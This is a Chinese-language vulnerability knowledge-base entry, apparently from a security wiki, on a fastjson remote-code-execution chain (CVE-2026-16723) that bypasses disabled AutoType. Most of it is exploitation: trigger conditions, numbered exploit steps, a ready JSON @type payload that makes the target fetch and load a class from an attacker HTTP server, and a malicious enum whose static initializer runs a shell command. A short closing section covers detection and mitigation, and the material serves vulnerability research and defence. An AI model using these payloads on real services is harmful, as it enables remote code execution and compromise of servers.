---
id: web-java-deser-fastjson-resource-probing-rce
title: fastjson AutoType 关闭时的资源探测类型名导致远程类加载 RCE
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-resource-probing-rce
tags:
- java
- fastjson
- deserialization
- autotype
- classloader
- rce
- cve-2026-16723
cve:
- CVE-2026-16723
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: 1.2.68 ≤ fastjson ≤ 1.2.83
verification:
  verified_by: verifier-B
  verified_at: '2026-11-04T18:47:56+08:00'
  notes: 已对照原文与 16 张内联截图核对：checkAutoType 资源探测、replace 编码、@JSONType 自证、TCCL/LaunchedURLClassLoader、EnumDeserializer 触发 clinit 均一致；PoC 未执行（未验证点：未重放）
url: /docs/web/java/deserialization/fastjson/web-java-deser-fastjson-resource-probing-rce/
draft: false
kb_aliases:
- fastjson 资源探测
- checkAutoType 绕过
- jar URL @type
- CVE-2026-16723
- fastjson 1.2.83 RCE
---

## 一句话结论

在 SafeMode 未开启的受影响 fastjson 版本中，即使 AutoType 关闭，`@type` 仍会被拼成资源路径并交给类加载器探测；攻击者用点号形式的嵌套 jar URL 指向自己的 class，class 上的 `@JSONType` 注解会让 fastjson 把它当作可信类型加载，随后 Enum 反序列化器初始化该类并执行 `<clinit>`，在应用进程权限下执行命令。

## 原理

`DefaultJSONParser#parseObject` 读到 `@type` 后调用 `ParserConfig#checkAutoType`：

- 先检查 SafeMode；默认 `safeMode=false`，进入 else；
- 当 `typeName` 长度在 3–191 之间时，执行：
  `String resource = typeName.replace('.', '/') + ".class";`
  再通过 `defaultClassLoader`（或 `ParserConfig.class.getClassLoader()`）的 `getResourceAsStream(resource)` 读取资源；
- 用 `ClassReader` 读取字节码，`TypeCollector` 以 `<clinit>` 为目标检查是否存在 `@JSONType` 注解，得到 `jsonType=true`；
- 后面的判断是 `if (autoTypeSupport || jsonType || expectClassFlag)`，因此 `jsonType` 为真时不需要 AutoType；
- `TypeUtils.loadClass(typeName, ...)` 会优先使用线程上下文类加载器（TCCL）。若 TCCL 是能解析嵌套 jar URL 的 `LaunchedURLClassLoader`，就能从攻击者 HTTP 服务下载并 defineClass；
- `checkAutoType` 返回该类后，`getDeserializer(clazz)` 选择 `EnumDeserializer`，其构造函数调用 `enumClass.getEnumConstants()`，触发类初始化并执行 `<clinit>`。

关键点是“检查的字符串”和“加载的二进制名”是同一个攻击者可控字符串：`replace('.', '/')` 把点号编码还原成斜杠，而 `@JSONType` 由远程 class 自己声明，等于让不可信类自证可信。

## 触发条件

- fastjson 版本处于受影响范围且未开启 SafeMode（AutoType 关闭并不能阻止本链）；
- 应用把不可信 JSON 交给 `JSON.parse`/`JSON.parseObject`；
- 部署方式使 TCCL 能加载嵌套 jar URL（典型为 Spring Boot 可执行 fat-jar，`java -jar` 启动）；
- 目标可出网访问攻击者 HTTP 服务；
- 攻击者能提供自定义 class 字节码（this_class 为 jar URL 形式、带 `@JSONType`、初始化时执行代码）。

## 利用步骤

1. 确认 fastjson 版本、SafeMode 状态与部署方式（fat-jar / TCCL 类型）；
2. 准备恶意 class：this_class 写成 `jar:http://<decimal-ip>:<port>/<path>!/<Class>`，父类 `java/lang/Enum`，带 `Lcom/alibaba/fastjson/annotation/JSONType;` 注解，包含 enum 常量与 `<clinit>`；
3. 按 fastjson 的替换规则反向编码：`://` 写成 `:..`，`/` 写成 `.`，主机用十进制 IP 避免点号被替换；
4. 把 payload 作为 `@type` 直接发送，或嵌在目标 DTO 字段中；
5. 观察攻击者 HTTP 服务收到 class 请求，目标日志出现 `POC_EXECUTED` 或命令副作用。

## PoC

```json
{"@type":"jar:http:..2130706433:19090.evilEnum!.ExploitEnum"}
```

其中 `2130706433` 是 `127.0.0.1` 的十进制形式；`jar:http://127.0.0.1:19090/evilEnum!/ExploitEnum` 经过 `replace('.', '/')` 后还原为嵌套 jar URL。

恶意 enum 的等价语义（实际 class 文件的 this_class 必须是 URL，不能直接由普通 Java 源码编译得到）：

```java
@JSONType
enum ExploitEnum {
    PWN;
    static {
        Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "whoami > poc_result.txt"});
        System.out.println("POC_EXECUTED:ExploitEnum");
        PWN = new ExploitEnum("PWN", 0);
        $VALUES = new ExploitEnum[]{PWN};
    }
}
```

嵌套在业务 DTO 中同样触发：

```json
{"username":"alice","password":"p","extra":{"@type":"jar:http:..2130706433:19090.evilEnum!.ExploitEnum"}}
```

## 变体与关联

- 变体：payload 嵌入任意被 fastjson 解析的 DTO 字段；更换端口、路径和类名；用十进制/其他无点号形式表示主机。
- 关联：[[web-java-classloader-tccl-nested-jar-type-loading]]（为什么需要特定 TCCL）；[[web-java-deser-fastjson-jdbc-rowset]]（另一条 fastjson AutoType/JNDI 链）。
- 不确定点：不同小版本的 `checkAutoType` 行号与长度边界可能略有差异，利用前以目标 jar 反编译结果为准。

## 检测与防御

- 检测：请求体中出现 `@type` 且值包含 `jar:`、`!`、十进制 IP、异常点号编码；fastjson 解析后对陌生域名发起 HTTP GET；应用日志出现异常类名。
- 防御：开启 SafeMode（`-Dfastjson.parser.safeMode=true` 或 `ParserConfig.getGlobalInstance().setSafeMode(true)`），其检查发生在资源探测之前；升级到包含 `hasIllegalTypeNameChars` 检查的修复版本（1.2.84 起在资源探测前拒绝含 `:` 或 `!` 的类型名）；限制应用出网；不要把不可信输入直接交给 fastjson。
